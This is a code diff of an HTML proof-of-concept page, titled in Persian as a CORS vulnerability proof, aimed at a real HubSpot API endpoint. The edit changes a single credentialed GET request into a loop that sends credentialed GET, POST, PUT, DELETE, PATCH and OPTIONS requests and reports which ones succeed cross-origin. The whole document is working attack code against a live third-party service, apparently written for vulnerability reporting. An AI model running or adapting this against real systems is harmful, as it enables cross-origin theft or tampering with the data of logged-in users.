@@ -5,35 +5,43 @@
 </head>
 <body>
     <h1>✅ اثبات آسیب‌پذیری CORS</h1>
-    <button onclick="getData()" style="padding:10px 20px;font-size:16px;">کلیک کن تا داده‌ها رو ببینی</button>
-    <pre id="result" style="background:#f4f4f4;padding:15px;margin-top:20px;border-radius:5px;"></pre>
+    <button onclick="testMethods()" style="padding:10px 20px;font-size:16px;">کلیک کن تا همه متدها رو تست کنه</button>
+    <pre id="result" style="background:#f4f4f4;padding:15px;margin-top:20px;border-radius:5px;white-space:pre-wrap;"></pre>
 
     <script>
-    function getData() {
+    function testMethods() {
         const url = "https://app.hubspot.com/api/usage-logging/v1/log/hublytics-multi/no-auth";
+        const methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'];
+        let output = '🔄 تست متدهای مختلف:\n\n';
         
-        fetch(url, {
-            method: "GET",
-            credentials: "include"
-        })
-        .then(response => {
-            const originHeader = response.headers.get('access-control-allow-origin');
-            const credHeader = response.headers.get('access-control-allow-credentials');
-            
-            document.getElementById('result').innerHTML = 
-                '✅ درخواست ارسال شد!\n\n' +
-                '📌 Access-Control-Allow-Origin: ' + originHeader + '\n' +
-                '📌 Access-Control-Allow-Credentials: ' + credHeader + '\n\n' +
-                '📦 داده‌های برگشتی از سرور:\n' +
-                '----------------------------------------\n';
-            
-            return response.text();
-        })
-        .then(data => {
-            document.getElementById('result').innerHTML += data;
-        })
-        .catch(err => {
-            document.getElementById('result').innerHTML = '❌ خطا: ' + err;
+        methods.forEach(method => {
+            fetch(url, {
+                method: method,
+                credentials: "include",
+                headers: {
+                    "Content-Type": "application/json"
+                }
+            })
+            .then(response => {
+                const originHeader = response.headers.get('access-control-allow-origin');
+                const credHeader = response.headers.get('access-control-allow-credentials');
+                
+                output += `✅ متد ${method}:\n`;
+                output += `   Status: ${response.status}\n`;
+                output += `   Access-Control-Allow-Origin: ${originHeader || 'NOT SET'}\n`;
+                output += `   Access-Control-Allow-Credentials: ${credHeader || 'NOT SET'}\n`;
+                
+                // اگر status 200 یا 201 بود، یعنی کار می‌کند
+                if (response.status === 200 || response.status === 201 || response.status === 204) {
+                    output += `   ✅ این متد کار می‌کند!\n`;
+                }
+                output += '\n';
+                document.getElementById('result').innerHTML = output;
+            })
+            .catch(err => {
+                output += `❌ متد ${method}: خطا - ${err}\n\n`;
+                document.getElementById('result').innerHTML = output;
+            });
         });
     }
     </script>
